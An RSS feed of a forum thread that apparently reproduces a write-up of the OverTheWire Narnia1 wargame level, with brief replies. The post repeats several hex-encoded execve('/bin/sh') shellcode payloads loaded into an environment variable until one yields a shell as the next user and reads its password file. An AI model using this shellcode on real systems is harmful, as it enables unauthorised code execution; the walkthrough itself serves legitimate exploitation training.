<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Over The Wire: Narnia1 - Environment variables and Shellcode</title>
    <link>https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675</link>
    <description>## Over The Wire: Narnia1 - Popping a shell. 

Ok, now that we&#39;ve gotten past [narnia0](https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663), it&#39;s time to do narnia1.
Go ahead and ssh into the narnia server with username narnia1 and the password acquired from level 0.

&gt;123loaded@redhat ssh narnia1@labs.overthewire.org
ssh narnia1@narnia.labs.overthewire.org

&gt;This is the OverTheWire game server. More information on http://www.overthewire.org/wargames

&gt;Please note that wargame usernames are no longer level&lt;X&gt;, but wargamename&lt;X&gt;
e.g. vortex4, semtex2, ...

&gt;Note: at this moment, blacksun is not available.

&gt;narnia1@narnia.labs.overthewire.org&#39;s password: 
               
&gt;Welcome to the OverTheWire games machine!

Then go ahead and check out the source code to narnia1.
&gt;narnia1@melinda:~$ cd /games/
narnia1@melinda:/games$ ls
behemoth  eloi  krypton  manpage  maze  narnia  semtex  utumno  vortex
narnia1@melinda:/games$ cd narnia
narnia1@melinda:/games/narnia$ ls
narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
narnia1@melinda:/games/narnia$ cat narnia1.c
&gt;int main(){
    int (*ret)();

&gt;    if(getenv(&quot;EGG&quot;)==NULL){    
        printf(&quot;Give me something to execute at the env-variable EGG\n&quot;);
        exit(1);
    }

&gt;    printf(&quot;Trying to execute EGG!\n&quot;);
&gt;    ret = getenv(&quot;EGG&quot;);
&gt;    ret();

&gt;    return 0;
}

Ok, so without going into the semantics of C and how they set the variable **ret** equal to a **pointer to a function**, we can see that this program gets data from the environment variable **$EGG** and then tries to _run_ what is in **$EGG**. However, it isn&#39;t just running it like passing it to a command line or anything... the way this code is written, the program gets the memory address of **$EGG** and sets it equal to **ret**. When **ret()** is called, the code is going to jump to where **$EGG** is stored, and from there it expects machine instructions to continue execution flow. 

Essentially they&#39;ve just given us a program where we have control of the execution flow, and by inserting specific machine instructions, we can call /bin/sh, under privileges of the user narnia2 to gain access to narnia2&#39;s password. These machine instructions, are referred to as **shellcode**. Shellcode is basically a list of carefully crafted instructions that can be executed once the code is injected into a running application. The term shellcode literally refers to written code that starts a command shell, but often times shellcode is writen to do more robust tasks, commonly something like a reverse tcp bind to a given a remote user who is listening on the connect back port access to the shell he just popped.

Shellcode is **operating system (read: architecture) and machine** specific... the shellcode used to pop a shell on one architecture is _not_ going to pop a shell on another architecture. (Note: **machine** specific is referring to a machine that has some BIOS options enabled such as disabling execute bit (NXBit), this may cause shellcode to work on one machine but not another even though they&#39;re running the same OS and hardware.)

So, if you&#39;re feeling super leet, you could [write your own shellcode](https://0x00sec.org/t/linux-shellcoding-part-1-0/289). This can be done as simply as creating a small program in C/C++ that literally just does &quot;execve(&quot;/bin/sh&quot;,0,0);&quot;, compile your program into an executable binary, and then [extract the shellcode out of your binary](https://0x00sec.org/t/extracting-a-payload/667) using objdump, hd, xxd, or a custom program like @unh0lys0da&#39;s h2d.

However, for this tutorial, we&#39;re just going to google for shellcode  and try some out until we find some that works. But first we need to know some system information, primarily just the architecture type of the CPU. For this info, we try &quot;arch&quot;, and then realize that the info given by arch really just specifies 32 or 64 bit... &quot;lscpu&quot; gives much more detailed info.
&gt;narnia1@melinda:~$ arch
x86_64
narnia1@melinda:~$ lscpu
Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                8
On-line CPU(s) list:   0-7
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             8
NUMA node(s):          1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 45
Stepping:              7
CPU MHz:               2599.998
BogoMIPS:              5202.66
Hypervisor vendor:     KVM
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              20480K
NUMA node0 CPU(s):     0-7

Ok, so knowing that this is an Intel CPU that can run either 32 or 64 bit op-codes, this must be a 64 bit Intel CPU. A great website for shellcode is [shell-storm.](http://shell-storm.org/shellcode/) Once we find some shellcode we want to try, we need to create the environment variable **$EGG** and set it to our shellcode using the **export** command. But remember, shellcode (machine code in general) is not in the realm of printable ASCII (all the characters you know and can read)... we will use **python** to turn our shellcode into raw machine code. 

&gt;narnia1@melinda:/games/narnia$ export EGG=\`python -c &#39;print &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;&#39;\`
narnia1@melinda:/games/narnia$ echo $EGG
H1�H�//bin/shH�SH��PWH���; 

Ok, breaking this down, **export** creates an environment variable. In this case we named it EGG. We use **python** with the **-c** option to run a single command from the command line, rather than open python interpreter. We have to put quotes around the entire **print** command to have it work, and the **print** command itself requires that we pass its argument in quotes as well. _(Note that it doesn&#39;t matter whether you single quote the print statement and double quote its argument or double quote the print statement and single quote its argument, you just have to use different types of quotes for the different arguments.)_  The &quot;\x&quot; is telling python that the value is a hex value, which is always converted to/from machine code as two hexadecimal characters (0-9 or A-F). Hex values **_can_** be printable characters... for example, **python -c &#39;print &quot;\x41\x42\x43\x44&quot;&#39;** will have python print out &quot;ABCD&quot; because A is 41 in hex, B is 42, and so on. 

Lastly, we surround our entire **python** command in **back ticks** ( \` ) because when you put a command in back ticks, bash executes that statement first, and then uses the result in place of the back-ticked string. Conversely, this can be done by putting the statement in parenthesis like so, with a dollar sign at the front.
&gt;narnia1@melinda:/games/narnia$ export EGG=$(python -c &#39;print &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;&#39;)
narnia1@melinda:/games/narnia$ echo $EGG
H1�H�//bin/shH�SH��PWH���;

So now lets run narnia1!
&gt;narnia1@melinda:/games/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault

Errrr crap, would appear that that shellcode doesn&#39;t work quite right on this architecture.... let&#39;s find another and try again.
&gt;narnia1@melinda:/games/narnia$ export EGG=\`python -c &#39;print &quot;\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81&quot;&#39;\`
narnia1@melinda:/games/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault

Nope... ok, lets try until something works.
&gt;narnia1@melinda:/games/narnia$ export EGG=\`python -c &#39;print &quot;\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x50\x8d\x53\x08\x52\x53\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff/bin/sh&quot;&#39;\`
narnia1@melinda:/games/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault
narnia1@melinda:/games/narnia$ echo $EGG
�[1��C��C
          P�RS�;P̀�����/bin/sh
narnia1@melinda:/games/narnia$ export EGG=\`python -c &#39;print &quot;\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x52\x53\x53\x6a\x3b\x58\xcd\x80&quot;&#39;\`
narnia1@melinda:/games/narnia$ echo $EGG
�Rhn/shh//bi��QRSSj;X̀
narnia1@melinda:/games/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault
narnia1@melinda:/games/narnia$ export EGG=\`python -c &#39;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#39;\`
narnia1@melinda:/games/narnia$ echo $EGG
1�H�ѝ��Ќ��H��ST_�RWT^�;
narnia1@melinda:/games/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault
narnia1@melinda:/games/narnia$ export EGG=\`python -c &#39;print &quot;\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43&quot;&#39;\`
narnia1@melinda:/games/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ ls
narnia0    narnia1.c  narnia3     narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
narnia1    narnia2.c  narnia4     narnia5.c  narnia7    narnia8.c
$ cd /etc/narnia_pass
$ ls
narnia0  narnia2  narnia4  narnia6  narnia8
narnia1  narnia3  narnia5  narnia7  narnia9
$ cat narnia2

Awesome. Now we have the password to narnia2, and more importantly, we have verified that a specific shellcode works on the narnia servers, because you Always want to verify your shellcode works before trying to jump into creating an exploit and want/Need to be able to rule that out as a possible reason your exploit might not be landing like you&#39;d expect.</description>
    
    <lastBuildDate>Tue, 16 Aug 2016 08:15:30 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Over The Wire: Narnia1 - Environment variables and Shellcode</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/6</link>
        <pubDate>Sun, 21 Jan 2018 00:42:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-675-6</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675.rss">Over The Wire: Narnia1 - Environment variables and Shellcode</source>
      </item>
      <item>
        <title>Over The Wire: Narnia1 - Environment variables and Shellcode</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Your sentence is a bit broader I guess, but, in the context of the discussion in this post. Yes…</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/5</link>
        <pubDate>Tue, 16 Aug 2016 08:15:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-675-5</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675.rss">Over The Wire: Narnia1 - Environment variables and Shellcode</source>
      </item>
      <item>
        <title>Over The Wire: Narnia1 - Environment variables and Shellcode</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>The way the .text section is interpreted depends on what the ELF header of the file says right? (ELF32 or ELF64)</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/4</link>
        <pubDate>Tue, 16 Aug 2016 02:12:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-675-4</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675.rss">Over The Wire: Narnia1 - Environment variables and Shellcode</source>
      </item>
      <item>
        <title>Over The Wire: Narnia1 - Environment variables and Shellcode</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Ha xD It’s funny how the shellcode matched with the sites emoji function and inserted a <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue_winking_eye.png?v=9" title=":stuck_out_tongue_winking_eye:" class="emoji" alt=":stuck_out_tongue_winking_eye:"> in the code. <img src="https://0x00sec.org/images/emoji/twitter/laughing.png?v=9" title=":laughing:" class="emoji" alt=":laughing:"></p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/3</link>
        <pubDate>Fri, 22 Jul 2016 21:41:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-675-3</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675.rss">Over The Wire: Narnia1 - Environment variables and Shellcode</source>
      </item>
      <item>
        <title>Over The Wire: Narnia1 - Environment variables and Shellcode</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Nice post.</p>
<p>The different interrelations between user space and kernel regarding the architecture is not trivial. But as a general rule, what is relevant, from the point of view of a shellcode is the architecture of the user space. Anyone interested on how  this works on Linux, should read this great article.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e3ab9932ec4122e287ecab561115b35feded05c7.png" class="site-icon" width="" height="">
      <a href="https://lwn.net/Articles/604515/" target="_blank" rel="noopener nofollow ugc">lwn.net</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://lwn.net/Articles/604515/" target="_blank" rel="noopener nofollow ugc">Anatomy of a system call, part 2 [LWN.net]</a></h3>

<p>
      The previous article explored the kernel
      implementation of system calls (syscalls) in its most vanilla form: a
      normal syscall, on the most common architecture: x86_64.  We complete our
      look at syscalls with variations on that...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>EDIT: What I tried to meant is that you need to look to the type of executable <code>file narnia1</code> instead of looking to the processor. You can run 32bits code in a 64bits processor running a 64bits OS. Many of the sheelcodes you tried are 64bits. And the important thing related to 32/64 bits is that <em>system calls have different id</em> in each platform:</p>
<pre><code>32bits exec -&gt; 0c0b
64bits exec -&gt; 0x3b</code></pre>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/2</link>
        <pubDate>Thu, 30 Jun 2016 17:16:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-675-2</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675.rss">Over The Wire: Narnia1 - Environment variables and Shellcode</source>
      </item>
      <item>
        <title>Over The Wire: Narnia1 - Environment variables and Shellcode</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <h2>Over The Wire: Narnia1 - Popping a shell.</h2>
<p>Ok, now that we’ve gotten past <a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663">narnia0</a>, it’s time to do narnia1.<br>
Go ahead and ssh into the narnia server with username narnia1 and the password acquired from level 0.</p>
<blockquote>
<p>123loaded@redhat ssh <a href="mailto:narnia1@labs.overthewire.org">narnia1@labs.overthewire.org</a><br>
ssh <a href="mailto:narnia1@narnia.labs.overthewire.org">narnia1@narnia.labs.overthewire.org</a></p>
</blockquote>
<blockquote>
<p>This is the OverTheWire game server. More information on <a href="http://www.overthewire.org/wargames" rel="nofollow noopener">http://www.overthewire.org/wargames</a></p>
</blockquote>
<blockquote>
<p>Please note that wargame usernames are no longer level, but wargamename<br>
e.g. vortex4, semtex2, …</p>
</blockquote>
<blockquote>
<p>Note: at this moment, blacksun is not available.</p>
</blockquote>
<blockquote>
<p><a href="mailto:narnia1@narnia.labs.overthewire.org">narnia1@narnia.labs.overthewire.org</a>’s password:</p>
</blockquote>
<blockquote>
<p>Welcome to the OverTheWire games machine!</p>
</blockquote>
<p>Then go ahead and check out the source code to narnia1.</p>
<blockquote>
<p>narnia1@melinda:~$ cd /games/<br>
narnia1@melinda:/games$ ls<br>
behemoth  eloi  krypton  manpage  maze  narnia  semtex  utumno  vortex<br>
narnia1@melinda:/games$ cd narnia<br>
narnia1@melinda:/games/narnia$ ls<br>
narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c<br>
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8<br>
narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c<br>
narnia1@melinda:/games/narnia$ cat narnia1.c<br>
int main(){<br>
int (*ret)();</p>
</blockquote>
<blockquote>
<p>if(getenv(“EGG”)==NULL){<br>
printf(“Give me something to execute at the env-variable EGG\n”);<br>
exit(1);<br>
}</p>
</blockquote>
<blockquote>
<p>printf(“Trying to execute EGG!\n”);<br>
ret = getenv(“EGG”);<br>
ret();</p>
</blockquote>
<blockquote>
<p>return 0;<br>
}</p>
</blockquote>
<p>Ok, so without going into the semantics of C and how they set the variable <strong>ret</strong> equal to a <strong>pointer to a function</strong>, we can see that this program gets data from the environment variable <strong>$EGG</strong> and then tries to <em>run</em> what is in <strong>$EGG</strong>. However, it isn’t just running it like passing it to a command line or anything… the way this code is written, the program gets the memory address of <strong>$EGG</strong> and sets it equal to <strong>ret</strong>. When <strong>ret()</strong> is called, the code is going to jump to where <strong>$EGG</strong> is stored, and from there it expects machine instructions to continue execution flow.</p>
<p>Essentially they’ve just given us a program where we have control of the execution flow, and by inserting specific machine instructions, we can call /bin/sh, under privileges of the user narnia2 to gain access to narnia2’s password. These machine instructions, are referred to as <strong>shellcode</strong>. Shellcode is basically a list of carefully crafted instructions that can be executed once the code is injected into a running application. The term shellcode literally refers to written code that starts a command shell, but often times shellcode is writen to do more robust tasks, commonly something like a reverse tcp bind to a given a remote user who is listening on the connect back port access to the shell he just popped.</p>
<p>Shellcode is <strong>operating system (read: architecture) and machine</strong> specific… the shellcode used to pop a shell on one architecture is <em>not</em> going to pop a shell on another architecture. (Note: <strong>machine</strong> specific is referring to a machine that has some BIOS options enabled such as disabling execute bit (NXBit), this may cause shellcode to work on one machine but not another even though they’re running the same OS and hardware.)</p>
<p>So, if you’re feeling super leet, you could <a href="https://0x00sec.org/t/linux-shellcoding-part-1-0/289">write your own shellcode</a>. This can be done as simply as creating a small program in C/C++ that literally just does “execve(”/bin/sh",0,0);", compile your program into an executable binary, and then <a href="https://0x00sec.org/t/extracting-a-payload/667">extract the shellcode out of your binary</a> using objdump, hd, xxd, or a custom program like <span class="mention">@unh0lys0da</span>’s h2d.</p>
<p>However, for this tutorial, we’re just going to google for shellcode  and try some out until we find some that works. But first we need to know some system information, primarily just the architecture type of the CPU. For this info, we try “arch”, and then realize that the info given by arch really just specifies 32 or 64 bit… “lscpu” gives much more detailed info.</p>
<blockquote>
<p>narnia1@melinda:~$ arch<br>
x86_64<br>
narnia1@melinda:~$ lscpu<br>
Architecture:          x86_64<br>
CPU op-mode(s):        32-bit, 64-bit<br>
Byte Order:            Little Endian<br>
CPU(s):                8<br>
On-line CPU(s) list:   0-7<br>
Thread(s) per core:    1<br>
Core(s) per socket:    1<br>
Socket(s):             8<br>
NUMA node(s):          1<br>
Vendor ID:             GenuineIntel<br>
CPU family:            6<br>
Model:                 45<br>
Stepping:              7<br>
CPU MHz:               2599.998<br>
BogoMIPS:              5202.66<br>
Hypervisor vendor:     KVM<br>
Virtualization type:   full<br>
L1d cache:             32K<br>
L1i cache:             32K<br>
L2 cache:              256K<br>
L3 cache:              20480K<br>
NUMA node0 CPU(s):     0-7</p>
</blockquote>
<p>Ok, so knowing that this is an Intel CPU that can run either 32 or 64 bit op-codes, this must be a 64 bit Intel CPU. A great website for shellcode is <a href="http://shell-storm.org/shellcode/" rel="nofollow noopener">shell-storm.</a> Once we find some shellcode we want to try, we need to create the environment variable <strong>$EGG</strong> and set it to our shellcode using the <strong>export</strong> command. But remember, shellcode (machine code in general) is not in the realm of printable ASCII (all the characters you know and can read)… we will use <strong>python</strong> to turn our shellcode into raw machine code.</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ export EGG=`python -c ‘print “\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05”’`<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
H1�H�//bin/shH�SH��PWH���;</p>
</blockquote>
<p>Ok, breaking this down, <strong>export</strong> creates an environment variable. In this case we named it EGG. We use <strong>python</strong> with the <strong>-c</strong> option to run a single command from the command line, rather than open python interpreter. We have to put quotes around the entire <strong>print</strong> command to have it work, and the <strong>print</strong> command itself requires that we pass its argument in quotes as well. <em>(Note that it doesn’t matter whether you single quote the print statement and double quote its argument or double quote the print statement and single quote its argument, you just have to use different types of quotes for the different arguments.)</em>  The “\x” is telling python that the value is a hex value, which is always converted to/from machine code as two hexadecimal characters (0-9 or A-F). Hex values <strong><em>can</em></strong> be printable characters… for example, <strong>python -c ‘print “\x41\x42\x43\x44”’</strong> will have python print out “ABCD” because A is 41 in hex, B is 42, and so on.</p>
<p>Lastly, we surround our entire <strong>python</strong> command in <strong>back ticks</strong> ( ` ) because when you put a command in back ticks, bash executes that statement first, and then uses the result in place of the back-ticked string. Conversely, this can be done by putting the statement in parenthesis like so, with a dollar sign at the front.</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ export EGG=$(python -c ‘print “\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05”’)<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
H1�H�//bin/shH�SH��PWH���;</p>
</blockquote>
<p>So now lets run narnia1!</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault</p>
</blockquote>
<p>Errrr crap, would appear that that shellcode doesn’t work quite right on this architecture… let’s find another and try again.</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ export EGG=`python -c ‘print “\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81”’`<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault</p>
</blockquote>
<p>Nope… ok, lets try until something works.</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ export EGG=`python -c ‘print “\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x50\x8d\x53\x08\x52\x53\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff/bin/sh”’`<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
�[1��C��C<br>
P�RS�;P̀�����/bin/sh<br>
narnia1@melinda:/games/narnia$ export EGG=`python -c ‘print “\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x52\x53\x53\x6a\x3b\x58\xcd\x80”’`<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
�Rhn/shh//bi��QRSSj;X̀<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault<br>
narnia1@melinda:/games/narnia$ export EGG=`python -c ‘print “\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05”’`<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
1�H�ѝ��Ќ��H��ST_�RWT^�;<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault<br>
narnia1@melinda:/games/narnia$ export EGG=`python -c ‘print “\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43”’`<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
$ whoami<br>
narnia2<br>
$ ls<br>
narnia0    narnia1.c  narnia3     narnia4.c  narnia6    narnia7.c<br>
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8<br>
narnia1    narnia2.c  narnia4     narnia5.c  narnia7    narnia8.c<br>
$ cd /etc/narnia_pass<br>
$ ls<br>
narnia0  narnia2  narnia4  narnia6  narnia8<br>
narnia1  narnia3  narnia5  narnia7  narnia9<br>
$ cat narnia2</p>
</blockquote>
<p>Awesome. Now we have the password to narnia2, and more importantly, we have verified that a specific shellcode works on the narnia servers, because you Always want to verify your shellcode works before trying to jump into creating an exploit and want/Need to be able to rule that out as a possible reason your exploit might not be landing like you’d expect.</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675/1</link>
        <pubDate>Thu, 30 Jun 2016 06:20:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-675-1</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675.rss">Over The Wire: Narnia1 - Environment variables and Shellcode</source>
      </item>
  </channel>
</rss>
